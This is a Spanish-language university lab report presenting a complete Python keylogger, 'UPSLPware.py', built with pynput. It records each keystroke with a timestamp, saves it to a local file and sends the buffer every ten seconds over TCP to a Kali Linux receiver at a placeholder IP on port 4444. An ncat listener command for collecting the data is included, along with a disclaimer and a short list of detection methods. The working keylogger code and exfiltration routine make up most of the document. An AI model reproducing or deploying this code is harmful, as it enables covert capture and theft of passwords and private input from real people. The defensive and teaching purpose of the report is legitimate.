Parcial 1 · Actividad 3

No presiones Esc… todavía

Implementación de un programa basado en event hooks y callbacks que registra eventos de teclado, les asocia una marca temporal y transmite la telemetría hacia un receptor en una máquina Kali Linux dentro de un entorno de laboratorio controlado.

El objetivo es comprender el funcionamiento técnico de una técnica de captura de entrada y reconocer sus implicaciones en ciberseguridad, documentando cada paso del proceso.

Objetivos específicos

  • Modificar el código base para incorporar persistencia del registro.
  • Agregar asociación temporal a cada evento capturado.
  • Implementar envío controlado de eventos a receptor remoto.
  • Comprobar el funcionamiento mediante pruebas y capturas.

Requisitos técnicos

  • Python 3.x con librería pynput
  • Máquina atacante (Kali Linux) con netcat o receptor TCP
  • Red local / laboratorio aislado
  • Permisos de ejecución en el entorno de prueba

Código fuente

UPSLPware.py — Modificado

A partir del código base visto en clase, se incorporaron tres mejoras: persistencia en archivo, timestamp y transmisión periódica por socket TCP. 

# UPSLPware.py — Keylogger con persistencia, timestamp y exfiltración
from pynput.keyboard import Key, Listener
import datetime
import socket
import threading

# ==================== CONFIGURACIÓN ====================
LOG_FILE = "keylog.txt"
KALI_IP = "192.168.x.x"      # IP de la máquina Kali Linux
KALI_PORT = 4444               # Puerto del receptor en Kali
SEND_INTERVAL = 10             # Segundos entre envíos
# =======================================================

buffer = []
lock = threading.Lock()

def get_timestamp():
    """Genera marca temporal con milisegundos."""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

def format_event(event_type, key_data):
    """Formatea el evento según el estándar requerido."""
    ts = get_timestamp()
    return f"{ts} | {event_type} | {key_data}"

def save_to_file(line):
    """Persiste el evento en archivo local."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(line + "\n")

def send_to_kali(data_lines):
    """Envía los registros acumulados a la máquina Kali Linux."""
    if not data_lines:
        return
    try:
        payload = "\n".join(data_lines)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((KALI_IP, KALI_PORT))
            s.sendall(payload.encode("utf-8"))
        print(f"[+] Enviados {len(data_lines)} eventos a {KALI_IP}:{KALI_PORT}")
    except Exception as e:
        print(f"[!] Error de envío: {e}")

def periodic_sender():
    """Hilo que envía el buffer cada N segundos."""
    global buffer
    threading.Timer(SEND_INTERVAL, periodic_sender).start()
    with lock:
        if buffer:
            send_to_kali(buffer.copy())
            buffer.clear()

def on_press(key):
    """Callback: tecla presionada."""
    try:
        key_data = key.char
        event_type = "PRESS"
    except AttributeError:
        key_data = str(key)
        event_type = "SPECIAL"

    line = format_event(event_type, key_data)
    print(line)
    save_to_file(line)

    with lock:
        buffer.append(line)

def on_release(key):
    """Callback: tecla liberada."""
    line = format_event("RELEASE", str(key))
    print(line)
    save_to_file(line)

    with lock:
        buffer.append(line)

    if key == Key.esc:
        # Enviar lo pendiente antes de salir
        with lock:
            if buffer:
                send_to_kali(buffer.copy())
                buffer.clear()
        return False

# Iniciar hilo de envío periódico
periodic_sender()

print(f"[*] Keylogger iniciado. Log: {LOG_FILE} | Destino: {KALI_IP}:{KALI_PORT}")
print("[*] Presiona ESC para detener.\n")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("\n[*] Ejecución finalizada. Registros guardados en:", LOG_FILE)
⚠ Uso exclusivo en laboratorio controlado
Este código fue desarrollado únicamente con fines educativos dentro de un entorno de prácticas aislado. Su ejecución fuera de un contexto de aprendizaje autorizado constituye una violación de políticas de seguridad y puede tener consecuencias legales.

Funcionamiento y pruebas

¿Cómo se ejecuta la actividad?

1. Preparar el receptor en Kali Linux

En la máquina Kali se levanta un listener con ncat para recibir la telemetría:

root@kali:~# ncat -lkvp 4444

-l -> Escucha | -k -> Mantener abierta la conexión | -v -> Verbose (mostrar información completa y paso a paso) | -p 4444 -> Puerto)

2. Ejecutar el keylogger en la máquina víctima

Se corre el script de Python. Cada evento se imprime en consola, se guarda en keylog.txt y se acumula en un buffer:

Análisis técnico

Implicaciones de seguridad

Esta actividad demuestra cómo una técnica aparentemente simple, puede escalarse a una amenaza real cuando se combina con persistencia, asociación temporal y exfiltración de datos.

La persistencia del registro permite al atacante reconstruir la sesión completa del usuario incluso después de que la conexión de red se haya perdido. La marca temporal facilita el análisis forense y la correlación con otros eventos del sistema. El envío periódico por TCP minimiza la pérdida de datos y reduce la huella en memoria.

Desde la perspectiva defensiva, este tipo de malware se detecta mediante:

  • Monitoreo de procesos que acceden a /dev/input/event* (Linux) o APIs de bajo nivel (Windows).
  • Análisis de conexiones de red salientes no autorizadas hacia IPs desconocidas.
  • Detección de archivos de log sospechosos en directorios de usuario.
  • Uso de Endpoint Detection and Response (EDR) para identificar hooks de teclado.
